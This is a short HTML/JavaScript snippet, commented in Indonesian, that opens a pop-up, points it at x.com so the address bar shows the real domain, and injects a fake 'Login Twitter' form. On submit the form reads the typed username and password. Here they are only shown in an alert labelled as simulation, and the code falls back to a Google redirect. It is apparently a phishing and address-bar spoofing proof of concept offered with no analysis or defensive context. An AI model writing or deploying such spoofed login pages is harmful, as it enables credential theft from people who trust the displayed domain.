<script>
    function next() {
        // Redirect ke halaman Google setelah pengalihan
        w.location.replace('https://www.google.com:1234');
    }

    function f() {
        // Membuka jendela pop-up kosong
        w = window.open("");  

        // Menulis tampilan login di dalam pop-up
        w.document.write('<h2>Login Twitter</h2>');
        w.document.write('<form id="loginForm" action="#" method="post">');
        w.document.write('<label for="username">Username:</label><br>');
        w.document.write('<input type="text" id="username" name="username" placeholder="Username"><br><br>');
        w.document.write('<label for="password">Password:</label><br>');
        w.document.write('<input type="password" id="password" name="password" placeholder="Password"><br><br>');
        w.document.write('<input type="submit" value="Login"><br>');
        w.document.write('</form>');
        
        // Mengubah alamat URL ke x.com, address bar berubah
        w.location = "https://x.com";

        // Mengecek alamat URL setiap 1ms dan melakukan pengecekan
        i = setInterval(function() {
            try {
                // Cek apakah sudah berhasil di redirect ke x.com
                if (w.location.href === "https://x.com") {
                    // Setelah berhasil, lanjutkan untuk menampilkan login form
                    w.document.body.innerHTML = '<h2>Login Twitter</h2>';
                    w.document.body.innerHTML += '<form id="loginForm" action="#" method="post">';
                    w.document.body.innerHTML += '<label for="username">Username:</label><br>';
                    w.document.body.innerHTML += '<input type="text" id="username" name="username" placeholder="Username"><br><br>';
                    w.document.body.innerHTML += '<label for="password">Password:</label><br>';
                    w.document.body.innerHTML += '<input type="password" id="password" name="password" placeholder="Password"><br><br>';
                    w.document.body.innerHTML += '<input type="submit" value="Login"><br>';
                    w.document.body.innerHTML += '</form>';
                    
                    // Menghandle submit form untuk login
                    w.document.getElementById('loginForm').onsubmit = function(event) {
                        event.preventDefault();  // Mencegah reload halaman
                        var username = w.document.getElementById('username').value;
                        var password = w.document.getElementById('password').value;
                        alert("Username: " + username + "\nPassword: " + password); // Hanya untuk simulasi
                    };
                }
            } catch (e) {
                // Jika gagal, redirect ke halaman Google
                clearInterval(i);
                next();
            }
        }, 1);  // Mengecek setiap 1ms
    }
</script>

<a href="#" onclick="f()">Login X Twitter</a>
